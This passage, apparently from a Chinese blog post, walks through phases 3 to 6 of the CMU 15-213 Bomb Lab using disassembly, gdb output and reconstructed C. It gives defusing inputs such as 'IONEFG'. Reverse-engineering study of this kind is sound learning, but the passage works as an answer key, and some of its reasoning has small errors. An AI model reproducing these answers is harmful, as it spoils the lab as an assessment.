  400f8f:	eb 2d                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f91:	b8 85 01 00 00       	mov    $0x185,%eax -&amp;gt; eax = 0x185
  400f96:	eb 26                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax -&amp;gt; eax = 0xce
  400f9d:	eb 1f                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax -&amp;gt; eax = 0x2aa
  400fa4:	eb 18                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax -&amp;gt; eax = 0x147
  400fab:	eb 11                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;

  400fad:	e8 88 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax -&amp;gt; eax = 0
  400fb7:	eb 05                	jmp    400fbe &amp;lt;phase_3+0x7b&amp;gt;
  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax -&amp;gt; eax = 0x137

  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax
  400fc2:	74 05                	je     400fc9 &amp;lt;phase_3+0x86&amp;gt;
  400fc4:	e8 71 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;要注意的是指令&lt;code&gt;400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)&lt;/code&gt;中实现的是间接跳转（因为加了&lt;code&gt;*&lt;/code&gt;），那么我们需要找到&lt;code&gt;0x402470&lt;/code&gt;处的 8 字节地址，以它为跳转的基地址。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/wx 0x402470
0x402470:       0x00400f7c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个地址就是&lt;code&gt;0x400f7c&lt;/code&gt;。我们前面把输入的第一个数字移到了&lt;code&gt;%eax&lt;/code&gt;，那么我们需要通过&lt;code&gt;0x400f7c + 8 * %eax&lt;/code&gt;来确定我们的跳转目标。跳转以后会赋给&lt;code&gt;%eax&lt;/code&gt;相应的值，而后我们需要保证我们输入的第二个数等于&lt;code&gt;%eax&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这样逻辑就捋顺了，整个代码应该是一个&lt;code&gt;switch_case&lt;/code&gt;的结构，而&lt;code&gt;0x400f7c&lt;/code&gt;就是这个跳转表的首地址，&lt;code&gt;%eax&lt;/code&gt;是对应的索引。这个&lt;code&gt;phase&lt;/code&gt;的要求就是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;输入 2 个整数&lt;/li&gt;
&lt;li&gt;第一个整数必须小于等于 0x7，因为最多只有 7 个&lt;code&gt;case&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;输入的第二个数必须和其&lt;code&gt;case&lt;/code&gt;中赋给&lt;code&gt;%eax&lt;/code&gt;的值相同&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们设计第一个数是&lt;code&gt;0&lt;/code&gt;，那么第二个数就是&lt;code&gt;0xcf&lt;/code&gt;(&lt;code&gt;207&lt;/code&gt;)，我们试一试：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at bomb.c:90
90          /* I guess this is too easy so far.  Some more complex code will
(gdb) n
91           * confuse people. */
(gdb) n
Halfway there!
94          phase_defused();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功！&lt;/p&gt;
&lt;h2 id=&#34;phase4-分析：递归&#34;&gt;&lt;a href=&#34;#phase4-分析：递归&#34; class=&#34;headerlink&#34; title=&#34;phase4 分析：递归&#34;&gt;&lt;/a&gt;phase4 分析：递归&lt;/h2&gt;&lt;p&gt;首先还是对&lt;code&gt;phase_4&lt;/code&gt;进行了反汇编：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;000000000040100c &amp;lt;phase_4&amp;gt;:
  40100c:	48 83 ec 18          	sub    $0x18,%rsp
  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx
  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx
  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi
  40101f:	b8 00 00 00 00       	mov    $0x0,%eax
  401024:	e8 c7 fb ff ff       	callq  400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
  401029:	83 f8 02             	cmp    $0x2,%eax
  40102c:	75 07                	jne    401035 &amp;lt;phase_4+0x29&amp;gt;

  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)
  401033:	76 05                	jbe    40103a &amp;lt;phase_4+0x2e&amp;gt;
  401035:	e8 00 04 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;

  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx
  40103f:	be 00 00 00 00       	mov    $0x0,%esi
  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi
  401048:	e8 81 ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  40104d:	85 c0                	test   %eax,%eax
  40104f:	75 07                	jne    401058 &amp;lt;phase_4+0x4c&amp;gt;
  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)
  401056:	74 05                	je     40105d &amp;lt;phase_4+0x51&amp;gt;

  401058:	e8 dd 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
  40105d:	48 83 c4 18          	add    $0x18,%rsp
  401061:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在本代码中进行了如下过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;预留出 24 个字节的空间&lt;/li&gt;
&lt;li&gt;rcx &amp;#x3D; rsp + 12&lt;/li&gt;
&lt;li&gt;rdx &amp;#x3D; rsp + 8&lt;/li&gt;
&lt;li&gt;esi &amp;#x3D; 0x4025cf&lt;/li&gt;
&lt;li&gt;eax &amp;#x3D; 0&lt;/li&gt;
&lt;li&gt;sscanf 调用&lt;/li&gt;
&lt;li&gt;下面是带分支部分：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;if(eax != 0x2) &amp;#123;
    call bomb_explode
&amp;#125;
if(arg3 &amp;gt; 0xe) &amp;#123;
    call bomb_explode
&amp;#125;
edx = 0xe;
esi = 0x0;
edi = arg3
ret = func4(arg1,arg2,arg3)
if(eax != 0)
    call bomb_explode
if(arg2 == 0)
    return eax;
else
    call bomb_explode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里出现了非常熟悉的&lt;code&gt;sscanf&lt;/code&gt;调用，我们先看看&lt;code&gt;0x4025cf&lt;/code&gt;处是啥（如果不出意外应该是&lt;code&gt;%d %d&lt;/code&gt;）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x4025cf
0x4025cf:       &amp;quot;%d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;果然！果然！是让我们输入 2 个整数，如果不是两个的话就爆炸！此外，一开始的&lt;code&gt;arg3&lt;/code&gt;应该小于等于&lt;code&gt;0xe&lt;/code&gt;，否则爆炸，此外函数&lt;code&gt;func4&lt;/code&gt;返回的&lt;code&gt;eax&lt;/code&gt;应该为 0，否则爆炸。此外，&lt;code&gt;*(rsp + 12)&lt;/code&gt;（如果&lt;code&gt;func4&lt;/code&gt;里面没改变这个值的话应该还是&lt;code&gt;arg2&lt;/code&gt;）必须等于 0。&lt;/p&gt;
&lt;p&gt;那么我们来分析一下&lt;code&gt;func4&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000400fce &amp;lt;func4&amp;gt;:
  400fce:	48 83 ec 08          	sub    $0x8,%rsp
  400fd2:	89 d0                	mov    %edx,%eax
  400fd4:	29 f0                	sub    %esi,%eax
  400fd6:	89 c1                	mov    %eax,%ecx
  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx
  400fdb:	01 c8                	add    %ecx,%eax
  400fdd:	d1 f8                	sar    %eax
  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx
  400fe2:	39 f9                	cmp    %edi,%ecx
  400fe4:	7e 0c                	jle    400ff2 &amp;lt;func4+0x24&amp;gt;

  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx
  400fe9:	e8 e0 ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  400fee:	01 c0                	add    %eax,%eax
  400ff0:	eb 15                	jmp    401007 &amp;lt;func4+0x39&amp;gt;

  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax
  400ff7:	39 f9                	cmp    %edi,%ecx
  400ff9:	7d 0c                	jge    401007 &amp;lt;func4+0x39&amp;gt;

  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi
  400ffe:	e8 cb ff ff ff       	callq  400fce &amp;lt;func4&amp;gt;
  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax

  401007:	48 83 c4 08          	add    $0x8,%rsp
  40100b:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看起来有点长，但是不要惊慌！这里只有 3 个跳转，而且其中两个都是跳转到最后恢复栈的位置。其主要步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;分配 8 个字节的栈空间&lt;/li&gt;
&lt;li&gt;eax &amp;#x3D; edx&lt;/li&gt;
&lt;li&gt;eax -&amp;#x3D; esi&lt;br&gt;-&amp;gt; eax &amp;#x3D; edx - esi&lt;/li&gt;
&lt;li&gt;ecx &amp;#x3D; eax&lt;/li&gt;
&lt;li&gt;ecx &amp;gt;&amp;gt; 31&lt;br&gt;-&amp;gt; ecx &amp;#x3D; eax &amp;gt;&amp;gt; 31(eax 符号位拉满)&lt;/li&gt;
&lt;li&gt;eax +&amp;#x3D; ecx&lt;/li&gt;
&lt;li&gt;eax &amp;gt;&amp;gt; 1&lt;br&gt;-&amp;gt; eax &amp;#x3D; (eax + ecx) &amp;gt;&amp;gt; 1&lt;/li&gt;
&lt;li&gt;ecx &amp;#x3D; rax + rsi&lt;/li&gt;
&lt;li&gt;下面进入一段分支：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;if(ecx &amp;lt;= edi) &amp;#123;
    //400ff2
    eax = 0;
    if(ecx &amp;gt;= edi) &amp;#123;
        // 401007
        return rax;
    &amp;#125;
    else&amp;#123;
        esi = rcx + 0x1;
        ret = func4(arg1,arg2,arg3)
        eax = rax + rax + 1;
        return rax;
    &amp;#125;
&amp;#125;
else &amp;#123;
    edx = rcx - 0x1;
    ret = func4(arg1,arg2,arg3)
    eax = eax * 2;
    return rax;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;分析&lt;code&gt;func4&lt;/code&gt;，我们不难发现，该函数的传入参数是&lt;code&gt;%edx&lt;/code&gt;和&lt;code&gt;%esi&lt;/code&gt;，此外该函数是个递归函数。函数总的过程应该如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;eax = edx - esi
ecx = eax &amp;gt;&amp;gt; 31 (逻辑右移)
eax = (eax + ecx) &amp;gt;&amp;gt; 1 (算数右移)
ecx = rax + rsi
if(ecx &amp;lt;= edi) &amp;#123;
   eax = 0;
   if(ecx &amp;gt;= edi) &amp;#123;
       // 401007
       return rax;
   &amp;#125;
   else&amp;#123;
       esi = rcx + 0x1;
       ret = func4(arg1,arg2,arg3)
       eax = rax * 2 + 1;
       return rax;
   &amp;#125;
&amp;#125;
else &amp;#123;
   edx = rcx - 0x1;
   ret = func4(arg1,arg2,arg3)
   eax = eax * 2;
   return rax;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;经过变量调整重写的 C 版本如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;ret = arg3 - arg2
mid = ret &amp;gt;&amp;gt; 31
ret = (ret + ret &amp;gt;&amp;gt; 31) / 2;
mid = ret + arg2
if(mid &amp;lt;= arg1) &amp;#123;
   ret = 0;
   if(mid &amp;gt;= arg1) &amp;#123;
       return ret;
   &amp;#125;
   else&amp;#123;
    //    arg2 = mid + 1;
       return func4(arg1,mid + 1,arg3) * 2 + 1;
   &amp;#125;
&amp;#125;
else &amp;#123;
//    arg3 = mid - 1;
   return func4(arg1,arg2,mid - 1) * 2;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们看看什么情况下&lt;code&gt;eax = 0&lt;/code&gt;。（这到底是什么东西啊摔！）真没看懂是什么东西，试了个&lt;code&gt;0 0&lt;/code&gt;，通过了，先 mark 一下，后面再来检验：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb)
0 0
95          printf(&amp;quot;Halfway there!\n&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;phase5-分析-canary，循环与-ASCII-编码字符串&#34;&gt;&lt;a href=&#34;#phase5-分析-canary，循环与-ASCII-编码字符串&#34; class=&#34;headerlink&#34; title=&#34;phase5 分析: canary，循环与 ASCII 编码字符串&#34;&gt;&lt;/a&gt;phase5 分析: &lt;code&gt;canary&lt;/code&gt;，循环与 ASCII 编码字符串&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;(gdb)
97          /* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;数学不好呜呜呜。&lt;/p&gt;
&lt;p&gt;phase_5 的反汇编代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000401062 &amp;lt;phase_5&amp;gt;:
seg1:
  401062:	53                   	push   %rbx
  401063:	48 83 ec 20          	sub    $0x20,%rsp
  401067:	48 89 fb             	mov    %rdi,%rbx
  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401071:	00 00
  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
  401078:	31 c0                	xor    %eax,%eax
  40107a:	e8 9c 02 00 00       	callq  40131b &amp;lt;string_length&amp;gt;
  40107f:	83 f8 06             	cmp    $0x6,%eax
  401082:	74 4e                	je     4010d2 &amp;lt;phase_5+0x70&amp;gt;
  401084:	e8 b1 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;

  401089:	eb 47                	jmp    4010d2 &amp;lt;phase_5+0x70&amp;gt;
seg2:
  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx
  40108f:	88 0c 24             	mov    %cl,(%rsp)
  401092:	48 8b 14 24          	mov    (%rsp),%rdx
  401096:	83 e2 0f             	and    $0xf,%edx
  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx
  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)
  4010a4:	48 83 c0 01          	add    $0x1,%rax
  4010a8:	48 83 f8 06          	cmp    $0x6,%rax
  4010ac:	75 dd                	jne    40108b &amp;lt;phase_5+0x29&amp;gt;
  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)
  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi
  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi
  4010bd:	e8 76 02 00 00       	callq  401338 &amp;lt;strings_not_equal&amp;gt;
  4010c2:	85 c0                	test   %eax,%eax
  4010c4:	74 13                	je     4010d9 &amp;lt;phase_5+0x77&amp;gt;
  4010c6:	e8 6f 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;

  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4010d0:	eb 07                	jmp    4010d9 &amp;lt;phase_5+0x77&amp;gt;
seg3:
  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax
  4010d7:	eb b2                	jmp    40108b &amp;lt;phase_5+0x29&amp;gt;
seg4:
  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  4010e5:	00 00
  4010e7:	74 05                	je     4010ee &amp;lt;phase_5+0x8c&amp;gt;
  4010e9:	e8 42 fa ff ff       	callq  400b30 &amp;lt;__stack_chk_fail@plt&amp;gt;
seg5:
  4010ee:	48 83 c4 20          	add    $0x20,%rsp
  4010f2:	5b                   	pop    %rbx
  4010f3:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;整个过程还原为 C 语言如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;// 这个函数的参数是： %rdi
int phase5(char* buf)
&amp;#123;
    // 保存 rbx
    // 留出 32 个字节的空间
    rbx = rdi // buf 的地址保存在 rbx 中
    *(rsp + 24) = canary
    eax = 0 // 返回值 = 0
    call string_length // 返回字符串长度
    if(eax == 0x6) &amp;#123;
        eax = 0

        // //seg2
        // ecx = *(rbx + rax)
        // *rsp = cl
        // rdx = *rsp
        // edx = edx &amp;amp; 0xf
        // edx = *(rdx + 0x4024b0)
        // *(rsp + rax + 16) = dl
        // rax = rax &amp;amp; 0x1
        // if(rax != 0x6)
        // 	jump to seg2

        // seg2 应该是个循环，其格式如下：
        do &amp;#123;
            ecx = *(rbx + rax) -&amp;gt; 把(str+i)指向的4个字节赋给ecx
            *rsp = cl -&amp;gt; rsp指向处存储ecx的最低一个字节
            rdx = *rsp -&amp;gt; rdx = 最低的那个字节
            edx = edx &amp;amp; 0xf -&amp;gt; edx = 最低4位
            edx = *(rdx + 0x4024b0) -&amp;gt; edx = *(最低四位 + 0x4024b0)
            *(rsp + rax + 16) = dl -&amp;gt; rsp[i + 16] = edx的最低四位
            rax = rax + 0x1 -&amp;gt; rax 递增
        &amp;#125;while(rax != 0x6);

        *(rsp + 22) = 0 -&amp;gt; rsp[22] = 0 // 字符串的末尾是`\0`
        esi = 0x40245e
        rdi = rsp + 16
        call strings_not_equal // 判断 esi处的字符串和 rsp + 16处的6个字节的字符串是否相等
        if(eax == 0) &amp;#123;
            // seg4
            rax = *(rsp + 24) // canary
            // compare rax and canary
            if(rax == canary) &amp;#123;
                //seg5
                // release the stack
                return rax;
            &amp;#125;
            else &amp;#123;
                call __stack_chk_fail
            &amp;#125;
        &amp;#125;else &amp;#123;
            call bomb_explode
        &amp;#125;
    &amp;#125;
    else &amp;#123;
        call bomb_explode
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;0x40245e&lt;/code&gt;处的字符串如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s 0x40245e
0x40245e:       &amp;quot;flyers&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从上面的内容中我们可以看出：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;必须输入 6 个字符长度的字符串，否则炸弹爆炸&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsp + 16&lt;/code&gt;处的字符串和&lt;code&gt;0x40245e&lt;/code&gt;处的字符串&lt;code&gt;flyers&lt;/code&gt;相同。&lt;/li&gt;
&lt;li&gt;我们需要计算一下 seg2 那段到底对字符串做了什么操作：&lt;code&gt;edx的值 = *(0x4024b0 + str[i]的最低4位)&lt;/code&gt;，然后&lt;code&gt;str[i] = edx最低四位&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;最后&lt;code&gt;str&lt;/code&gt;需要等于&lt;code&gt;flyers&lt;/code&gt;，也就是说&lt;code&gt;*(0x4024b0 + str[i]的最低4位)的最低4位 = flyers&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其中&lt;code&gt;flyers&lt;/code&gt;的编码为：&lt;code&gt;0x40245e:       0x66    0x6c    0x79    0x65    0x72    0x73    0x00&lt;/code&gt;，最后一个&lt;code&gt;0x00&lt;/code&gt;在程序中手动设置了，所以无需自己设置。&lt;/p&gt;
&lt;p&gt;打印一下&lt;code&gt;0x4024b0&lt;/code&gt;开始的字符串：&lt;code&gt;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因此，本题的目的是在&lt;code&gt;0x4024b0&lt;/code&gt;开始的字符串中拼凑出&lt;code&gt;flyers&lt;/code&gt;，然后把每个字符相对于开头的偏移量计算出来。其几个字符的地址分别是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;f&lt;/code&gt;:0x09&lt;/li&gt;
&lt;li&gt;&lt;code&gt;l&lt;/code&gt;:0x0f&lt;/li&gt;
&lt;li&gt;&lt;code&gt;y&lt;/code&gt;:0x0e&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ers&lt;/code&gt;:0x05 0x06 0x07&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;综合起来是：&lt;code&gt;0x09 0x0f 0x0e 0x05 0x06 0x07&lt;/code&gt;。我们来试一下&lt;code&gt;*(0x4024b0 + str[i]的最低4位)&lt;/code&gt;是否等于&lt;code&gt;flyers&lt;/code&gt;。测试出来是这样的。但是这 6 个字节不是字符，为了凑成字符，我们对每个数字加上 64（因为在计算的时候只取最低 4 位，所以对一个字节加上 64 不影响最后的偏移量），得到&lt;code&gt;73, 79,78, 69, 70, 71&lt;/code&gt;(这里是 10 进制)，其对应的 ASCII 码是&lt;code&gt;IONEFG&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;phase6-分析-超级无敌杂糅嵌套多层循环&#34;&gt;&lt;a href=&#34;#phase6-分析-超级无敌杂糅嵌套多层循环&#34; class=&#34;headerlink&#34; title=&#34;phase6 分析: 超级无敌杂糅嵌套多层循环&#34;&gt;&lt;/a&gt;phase6 分析: 超级无敌杂糅嵌套多层循环&lt;/h2&gt;&lt;p&gt;phase_6 反汇编如下（哎哟我滴妈呀咋个这么长啊）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004010f4 &amp;lt;phase_6&amp;gt;:
seg1:
  4010f4:	41 56                	push   %r14
  4010f6:	41 55                	push   %r13
  4010f8:	41 54                	push   %r12
  4010fa:	55                   	push   %rbp
  4010fb:	53                   	push   %rbx
  4010fc:	48 83 ec 50          	sub    $0x50,%rsp
  401100:	49 89 e5             	mov    %rsp,%r13
  401103:	48 89 e6             	mov    %rsp,%rsi
  401106:	e8 51 03 00 00       	callq  40145c &amp;lt;read_six_numbers&amp;gt;
  40110b:	49 89 e6             	mov    %rsp,%r14
  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d
seg2:
  401114:	4c 89 ed             	mov    %r13,%rbp
  401117:	41 8b 45 00          	mov    0x0(%r13),%eax
  40111b:	83 e8 01             	sub    $0x1,%eax
  40111e:	83 f8 05             	cmp    $0x5,%eax
  401121:	76 05                	jbe    401128 &amp;lt;phase_6+0x34&amp;gt;
  401123:	e8 12 03 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
seg3:
  401128:	41 83 c4 01          	add    $0x1,%r12d
  40112c:	41 83 fc 06          	cmp    $0x6,%r12d
  401130:	74 21                	je     401153 &amp;lt;phase_6+0x5f&amp;gt;
  401132:	44 89 e3             	mov    %r12d,%ebx
seg4:
  401135:	48 63 c3             	movslq %ebx,%rax
  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax
  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)
  40113e:	75 05                	jne    401145 &amp;lt;phase_6+0x51&amp;gt;
  401140:	e8 f5 02 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
seg5:
  401145:	83 c3 01             	add    $0x1,%ebx
  401148:	83 fb 05             	cmp    $0x5,%ebx
  40114b:	7e e8                	jle    401135 &amp;lt;phase_6+0x41&amp;gt;
  40114d:	49 83 c5 04          	add    $0x4,%r13
  401151:	eb c1                	jmp    401114 &amp;lt;phase_6+0x20&amp;gt;
seg6:
  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi
  401158:	4c 89 f0             	mov    %r14,%rax
  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx
seg7:
  401160:	89 ca                	mov    %ecx,%edx
  401162:	2b 10                	sub    (%rax),%edx
  401164:	89 10                	mov    %edx,(%rax)
  401166:	48 83 c0 04          	add    $0x4,%rax
  40116a:	48 39 f0             	cmp    %rsi,%rax
  40116d:	75 f1                	jne    401160 &amp;lt;phase_6+0x6c&amp;gt;
  40116f:	be 00 00 00 00       	mov    $0x0,%esi
  401174:	eb 21                	jmp    401197 &amp;lt;phase_6+0xa3&amp;gt;
seg8:
  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  40117a:	83 c0 01             	add    $0x1,%eax
  40117d:	39 c8                	cmp    %ecx,%eax
  40117f:	75 f5                	jne    401176 &amp;lt;phase_6+0x82&amp;gt;
  401181:	eb 05                	jmp    401188 &amp;lt;phase_6+0x94&amp;gt;
seg9:
  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx
seg10:
  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)
  40118d:	48 83 c6 04          	add    $0x4,%rsi
  401191:	48 83 fe 18          	cmp    $0x18,%rsi
  401195:	74 14                	je     4011ab &amp;lt;phase_6+0xb7&amp;gt;
seg11:
  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx
  40119a:	83 f9 01             	cmp    $0x1,%ecx
  40119d:	7e e4                	jle    401183 &amp;lt;phase_6+0x8f&amp;gt;
  40119f:	b8 01 00 00 00       	mov    $0x1,%eax
  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx
  4011a9:	eb cb                	jmp    401176 &amp;lt;phase_6+0x82&amp;gt;
seg12:
  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
  4011ba:	48 89 d9             	mov    %rbx,%rcx
seg13:
  4011bd:	48 8b 10             	mov    (%rax),%rdx
  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)
  4011c4:	48 83 c0 08          	add    $0x8,%rax
  4011c8:	48 39 f0             	cmp    %rsi,%rax
  4011cb:	74 05                	je     4011d2 &amp;lt;phase_6+0xde&amp;gt;
  4011cd:	48 89 d1             	mov    %rdx,%rcx
  4011d0:	eb eb                	jmp    4011bd &amp;lt;phase_6+0xc9&amp;gt;
seg14:
  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
  4011d9:	00
  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp
seg15:
  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4011e3:	8b 00                	mov    (%rax),%eax
  4011e5:	39 03                	cmp    %eax,(%rbx)
  4011e7:	7d 05                	jge    4011ee &amp;lt;phase_6+0xfa&amp;gt;
  4011e9:	e8 4c 02 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
seg16:
  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
  4011f2:	83 ed 01             	sub    $0x1,%ebp
  4011f5:	75 e8                	jne    4011df &amp;lt;phase_6+0xeb&amp;gt;
  4011f7:	48 83 c4 50          	add    $0x50,%rsp
  4011fb:	5b                   	pop    %rbx
  4011fc:	5d                   	pop    %rbp
  4011fd:	41 5c                	pop    %r12
  4011ff:	41 5d                	pop    %r13
  401201:	41 5e                	pop    %r14
  401203:	c3                   	retq   s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们将其分为 16 个 seg，然后绘制一下函数流程图试试，总体过程如图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase6.png&#34; alt=&#34;图&#34;&gt;。&lt;/p&gt;
&lt;p&gt;然后，我们为了减小每步分析的工作量，根据跳转分支将其分为 6 个过程，如图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/segs.png&#34; alt=&#34;图&#34;&gt;&lt;/p&gt;
&lt;p&gt;下面我们对这 6 个过程来进行分析：&lt;/p&gt;
&lt;h3 id=&#34;Proc-1&#34;&gt;&lt;a href=&#34;#Proc-1&#34; class=&#34;headerlink&#34; title=&#34;Proc 1&#34;&gt;&lt;/a&gt;Proc 1&lt;/h3&gt;&lt;p&gt;首先进入的是 seg1，其做的工作是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;压入&lt;code&gt;r14 r13 r12 rbp rbx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;留出 80 个字节的空间&lt;/li&gt;
&lt;li&gt;&lt;code&gt;r13 = rsp = rsi&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;call_six_numbers&lt;/code&gt;，经前文分析，&lt;code&gt;read_six_numbers&lt;/code&gt;的传入参数为&lt;code&gt;%rsi&lt;/code&gt;，返回值在&lt;code&gt;%eax&lt;/code&gt;中，其存储了读入的数字的个数&lt;/li&gt;
